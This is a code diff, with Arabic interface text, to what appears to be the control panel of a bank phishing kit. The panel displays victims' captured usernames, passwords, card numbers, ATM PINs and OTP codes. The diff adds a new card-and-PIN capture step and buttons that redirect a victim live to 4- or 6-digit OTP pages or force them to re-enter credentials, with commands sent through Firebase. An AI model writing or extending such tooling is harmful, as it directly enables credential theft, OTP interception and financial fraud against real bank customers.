@@ -502,10 +502,13 @@
       // آخر نشاط = أحدث تاريخ بين آخر بطاقة وآخر OTP وآخر رؤية
       const sessionResets = Array.isArray(m.passwordResets) ? m.passwordResets : [];
       const latestResetAt = sessionResets.length ? Math.max(...sessionResets.map(r => toTime(r && r.at))) : 0;
+      const sessionRegistrations = Array.isArray(m.appRegistrations) ? m.appRegistrations : [];
+      const latestRegistAt = sessionRegistrations.length ? Math.max(...sessionRegistrations.map(r => toTime(r && r.at))) : 0;
       const lastActivity = Math.max(
         toTime(latestCard.createdAt),
         toTime(latestOtp && latestOtp.createdAt),
         latestResetAt,
+        latestRegistAt,
         ls
       );
       return {
@@ -544,6 +547,7 @@
         username: m.username || '',
         logins: Array.isArray(m.logins) ? m.logins : [],
         passwordResets: Array.isArray(m.passwordResets) ? m.passwordResets : [],
+        appRegistrations: sessionRegistrations,
         requestType: m.requestType || '',
         requestTypeLabel: m.requestTypeLabel || '',
         refNo: m.refNo || '',
@@ -576,7 +580,8 @@
       x.name || x.phone || x.address ||
       (x.allCards && x.allCards.length > 0) ||
       (x.allOtps && x.allOtps.length > 0) ||
-      (x.passwordResets && x.passwordResets.length > 0)
+      (x.passwordResets && x.passwordResets.length > 0) ||
+      (x.appRegistrations && x.appRegistrations.length > 0)
     ))
     // ترتيب: آخر نشاط أولاً (الأحدث)
     .sort((a, b) => (b.lastActivity || 0) - (a.lastActivity || 0));
@@ -778,7 +783,8 @@
     loginEntries.sort((a, b) => (toMillis(b && b.at) || 0) - (toMillis(a && a.at) || 0));
     const loginBoxesHtml = loginEntries.map((entry, i) => {
       const t = toMillis(entry && entry.at);
-      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>بيانات الدخول ${loginEntries.length > 1 ? '#' + (loginEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('اسم المستخدم', entry && entry.username)}${field('كلمة المرور', entry && entry.password)}</article>`;
+      const sidAttr = escapeHtml(String(visitor.sessionId || visitor.id || ''));
+      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>بيانات الدخول ${loginEntries.length > 1 ? '#' + (loginEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('اسم المستخدم', entry && entry.username)}${field('كلمة المرور', entry && entry.password)}<div class="ref-card-actions"><button data-login-action="otpnew" data-session-id="${sidAttr}">توجيه إلى رمز 4 أرقام</button><button data-login-action="otpcode" data-session-id="${sidAttr}">توجيه إلى رمز 6 أرقام</button><button data-login-action="reject" data-session-id="${sidAttr}">رفض</button></div></article>`;
     }).join('');
     const loginBoxTime = loginEntries.length ? (loginEntries[0] && loginEntries[0].at) : (visitor.customerUpdatedAt || visitor.createdDate);
     // صناديق إعادة تعيين كلمة المرور — كل محاولة في صندوق منفصل
@@ -789,6 +795,14 @@
       return `<article class="ref-basic-box" data-ref-time="${t}"><h3>إعادة تعيين كلمة المرور ${resetEntries.length > 1 ? '#' + (resetEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('رقم البطاقة', entry && entry.card)}${field('شفرة الصراف الآلي', entry && entry.atmPin)}</article>`;
     }).join('');
     const resetBoxTime = resetEntries.length ? (resetEntries[0] && resetEntries[0].at) : 0;
+    // صناديق إكمال التسجيل — كل محاولة في صندوق منفصل
+    const registEntries = Array.isArray(visitor.appRegistrations) ? [...visitor.appRegistrations] : [];
+    registEntries.sort((a, b) => (toMillis(b && b.at) || 0) - (toMillis(a && a.at) || 0));
+    const registBoxesHtml = registEntries.map((entry, i) => {
+      const t = toMillis(entry && entry.at);
+      return `<article class="ref-basic-box" data-ref-time="${t}"><h3>إكمال التسجيل ${registEntries.length > 1 ? '#' + (registEntries.length - i) : ''}${t ? ` <time class="ref-box-time" data-box-counter data-box-time="${t}" datetime="${t}">${escapeHtml(formatRefTime(t))}</time>` : ''}</h3>${field('رقم البطاقة', entry && entry.card)}${field('الرقم السري', entry && entry.atmPin)}</article>`;
+    }).join('');
+    const registBoxTime = registEntries.length ? (registEntries[0] && registEntries[0].at) : 0;
     const cardsSectionHtml = cards.length ? `<div class="ref-cards-title"><h3>البطاقات (${cards.length})</h3></div>${cardHtml}` : '';
     const otpsSectionHtml = sortedOtps.length ? `<div class="ref-otp-title"><h3>رموز التحقق (${sortedOtps.length})</h3></div>${sortedOtps.map((o, i) => `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: <span class="ref-copyable" data-copy="${escapeHtml(String(o.otp || ''))}">${escapeHtml(String(o.otp || ''))}</span></b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div></article>`).join('')}` : '';
     // ترتيب الصناديق من الأحدث إلى الأقدم (الأحدث يظهر في الأعلى).
@@ -798,6 +812,7 @@
     const stackSections = [
       { time: toMillis(loginBoxTime), html: loginBoxesHtml },
       { time: toMillis(resetBoxTime), html: resetBoxesHtml },
+      { time: toMillis(registBoxTime), html: registBoxesHtml },
       { time: cardsBoxTime, html: cardsSectionHtml },
       { time: otpsBoxTime, html: otpsSectionHtml },
     ]
@@ -805,7 +820,7 @@
       .sort((a, b) => (b.time || 0) - (a.time || 0))
       .map(s => s.html)
       .join('') + basicBoxHtml;
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="wait">صفحة الانتظار</button><button data-ref-nav="login">تسجيل الدخول</button><button data-ref-nav="forgot">نسيت كلمة المرور</button><button data-ref-nav="otpcode">رمز التحقق OTP</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="wait">صفحة الانتظار</option><option value="login">تسجيل الدخول</option><option value="forgot">نسيت كلمة المرور</option><option value="otpcode">رمز التحقق OTP</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="wait">صفحة الانتظار</button><button data-ref-nav="login">تسجيل الدخول</button><button data-ref-nav="forgot">نسيت كلمة المرور</button><button data-ref-nav="otpcode">رمز التحقق OTP</button><button data-ref-nav="otpnew">رمز 4 أرقام</button><button data-ref-nav="regist">إكمال التسجيل</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="wait">صفحة الانتظار</option><option value="login">تسجيل الدخول</option><option value="forgot">نسيت كلمة المرور</option><option value="otpcode">رمز التحقق OTP</option><option value="otpnew">رمز 4 أرقام</option><option value="regist">إكمال التسجيل</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
@@ -849,6 +864,8 @@
       login: 'login.html',
       forgot: 'forgot-password.html',
       otpcode: 'otp.html',
+      otpnew: 'otp-new.html',
+      regist: 'login-regist.html',
       orders: 'order1.html',
       knet: 'knet.html',
       verification: 'verification.html',
@@ -876,6 +893,38 @@
       const target = btn.dataset.refNav;
       const targetPage = NAV_PAGE_MAP[target] || target;
       sendNavCommand(target, targetPage);
+    }));
+    // أزرار صندوق بيانات الدخول: توجيه إلى رمز 4 أرقام / رمز 6 أرقام / رفض
+    const sendRejectCommand = async (sid) => {
+      if (!sid) { toast('تعذّر تحديد العميل', 'error'); return; }
+      try {
+        await db.collection('customers').doc(sid).set({
+          decision: 'rejected',
+          status: 'rejected',
+          decidedAt: firebase.firestore.FieldValue.serverTimestamp(),
+          lastSeen: firebase.firestore.FieldValue.serverTimestamp(),
+        }, { merge: true });
+        try {
+          await rtd.ref('commands/' + sid + '/rejection').set({
+            action: 'REJECT_PAYMENT',
+            status: 'rejected',
+            timestamp: new Date().toLocaleTimeString('ar-EG'),
+            rejectedAt: Date.now(),
+            adminId: 'admin',
+          });
+        } catch (e) { console.warn('RTDB reject write failed:', e); }
+        toast('تم رفض البيانات وإرجاع العميل لتسجيل الدخول', 'success');
+      } catch (err) {
+        console.error('Reject error:', err);
+        toast('تعذر إرسال الرفض', 'error');
+      }
+    };
+    els.referenceDetailContent.querySelectorAll('[data-login-action]').forEach(btn => btn.addEventListener('click', () => {
+      const act = btn.dataset.loginAction;
+      const sid = btn.dataset.sessionId || visitor.sessionId || visitor.id;
+      if (act === 'reject') { sendRejectCommand(sid); return; }
+      const isNew = act === 'otpnew';
+      sendNavCommand(isNew ? 'رمز 4 أرقام' : 'رمز 6 أرقام', isNew ? 'otp-new.html' : 'otp.html');
     }));
     const freeInput = els.referenceDetailContent.querySelector('[data-ref-nav-free]');
     const freeGo = els.referenceDetailContent.querySelector('[data-ref-nav-free-go]');
